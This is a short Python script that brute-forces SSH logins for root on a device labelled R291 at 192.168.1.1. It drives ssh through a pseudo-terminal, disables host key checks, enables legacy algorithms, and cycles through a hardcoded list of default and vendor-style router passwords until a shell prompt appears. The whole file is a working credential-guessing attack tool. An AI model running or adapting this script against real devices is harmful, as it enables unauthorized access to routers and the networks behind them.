#!/usr/bin/env python3
"""SSH brute-force to R291 with password via pty"""
import os, pty, select, sys, time

def ssh_try(host, user, password, cmd="id"):
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp("ssh", ["ssh",
                          "-o", "StrictHostKeyChecking=no",
                          "-o", "UserKnownHostsFile=/dev/null",
                          "-o", "ConnectTimeout=10",
                          "-o", "KexAlgorithms=+diffie-hellman-group14-sha1",
                          "-o", "HostKeyAlgorithms=+ssh-rsa",
                          "-o", "NumberOfPasswordPrompts=1",
                          "-o", "ServerAliveInterval=5",
                          f"{user}@{host}", cmd])
        sys.exit(1)

    output = b""
    password_sent = False
    start = time.time()
    while time.time() - start < 15:
        r, _, _ = select.select([fd], [], [], 1.0)
        if r:
            try:
                data = os.read(fd, 4096)
            except OSError:
                break
            if not data:
                break
            output += data
            if b"password:" in data.lower() and not password_sent:
                os.write(fd, (password + "\r").encode())
                password_sent = True
            elif b"$ " in data or b"#" in data or b"uid=" in data:
                # Got shell prompt - success!
                os.write(fd, b"exit\r")
                time.sleep(0.5)
                try:
                    more = os.read(fd, 4096)
                    output += more
                except:
                    pass
                os.close(fd)
                return True, output.decode(errors='replace')
            elif b"Permission denied" in data:
                # Failed, but might get another prompt
                pass

    os.close(fd)
    return False, output.decode(errors='replace')

passwords = [
    '$Passworld143',
    'Passworld143',
    'passworld143',
    'admin',
    'password',
    '12345678',
    'root',
    'admin123',
    'P@ssw0rd',
    'Zte521',
    '7icF3j8W',
    'Om@0Yt#5',
    'ooredoo',
    'Ooredoo',
    'MTK7621',
    'mtk7621',
    'ZTE',
    'zte',
    '',
    'user',
    'guest',
]

print("SSH brute-force to R291")
print("Target: root@192.168.1.1")
print(f"Testing {len(passwords)} passwords\n")

for pw in passwords:
    sys.stdout.write(f"  Trying '{pw}'... ")
    sys.stdout.flush()
    ok, out = ssh_try("192.168.1.1", "root", pw)
    if ok:
        print("SUCCESS!")
        print(out[:500])
        break
    elif "Connection refused" in out:
        print("Connection refused")
        break
    elif "Connection timed out" in out:
        print("Timeout")
        time.sleep(2)
    else:
        print("Failed")

print("\nDone.")
